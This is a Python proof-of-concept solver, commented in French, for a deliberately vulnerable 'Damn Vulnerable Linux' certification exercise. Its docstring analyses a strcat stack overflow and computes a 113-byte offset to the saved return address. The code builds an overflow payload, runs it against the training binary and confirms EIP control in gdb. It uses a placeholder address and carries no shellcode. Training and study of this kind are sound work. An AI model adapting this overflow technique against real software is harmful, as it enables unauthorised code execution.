#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solveur / PoC — cesd_dvl_assessment_2 (zero, « 01_exploitme02 »).

Assessment 02 de la certification CESD (Damn Vulnerable Linux). main() :
  - precharge un buffer local buf = [ebp-0x88] avec la chaine .rodata
    "Exploiting applications is " (27 octets, +NUL) ;
  - si argc > 1 : strcat(buf, argv[1])  -> pas de controle de longueur.

buf a ebp-0x88, adresse de retour sauvegardee a ebp+4 :
    distance buf -> ret = 0x88 + 4 = 0x8c = 140 octets.
strcat ajoute APRES le prefixe de 27 octets :
    offset dans argv[1] jusqu'a l'EIP = 140 - 27 = 113 octets.

Usage :
  ./crackmes-de-cesd_dvl_assessment_2-solve.py
  ./crackmes-de-cesd_dvl_assessment_2-solve.py --run BIN
  ./crackmes-de-cesd_dvl_assessment_2-solve.py --gdb BIN
"""
import sys, subprocess, struct, os, tempfile, zipfile

PREFIX_LEN = 27                    # "Exploiting applications is "
OFFSET = 0x88 + 4 - PREFIX_LEN     # = 113
NEW_EIP = 0x42424242               # "BBBB"


def payload(eip=NEW_EIP):
    return b"A" * OFFSET + struct.pack("<I", eip)


def extract_elf():
    here = os.path.dirname(os.path.abspath(__file__))
    zpath = os.path.join(here, "..", "original", "02_cesd_dvl_assessment_2.zip")
    if not os.path.exists(zpath):
        # nom reel du zip
        od = os.path.join(here, "..", "original")
        zpath = os.path.join(od, [f for f in os.listdir(od) if f.endswith(".zip")][0])
    tmp = tempfile.mkdtemp(prefix="cesd02_")
    with zipfile.ZipFile(zpath) as z:
        z.extract("01_exploitme02", tmp)
    p = os.path.join(tmp, "01_exploitme02")
    os.chmod(p, 0o755)
    return p


def main():
    args = sys.argv[1:]
    if not args:
        p = payload()
        print("prefixe (.rodata) : 'Exploiting applications is ' (%d octets)" % PREFIX_LEN)
        print("offset EIP        : %d" % OFFSET)
        print("EIP cible         : 0x%08x" % NEW_EIP)
        print("payload (len=%d) : %r...%r" % (len(p), p[:16], p[-4:]))
        return
    if args[0] == "--run":
        binp = args[1] if len(args) > 1 else extract_elf()
        r = subprocess.run([binp, payload().decode("latin1")])
        rc = r.returncode
        print("return code = %d (SIGSEGV attendu)" % rc)
        sys.exit(0 if rc in (139, -11) else 1)
    if args[0] == "--gdb":
        binp = args[1] if len(args) > 1 else extract_elf()
        arg = "A" * OFFSET + "BBBB"
        script = "set pagination off\nrun %s\ninfo registers eip\nquit\n" % arg
        with tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False) as f:
            f.write(script)
            gs = f.name
        out = subprocess.run(["gdb", "-q", "-batch", "-x", gs, binp],
                             capture_output=True, text=True)
        print(out.stdout)
        ok = "0x42424242" in out.stdout
        print("EIP controle :", "OUI" if ok else "non")
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
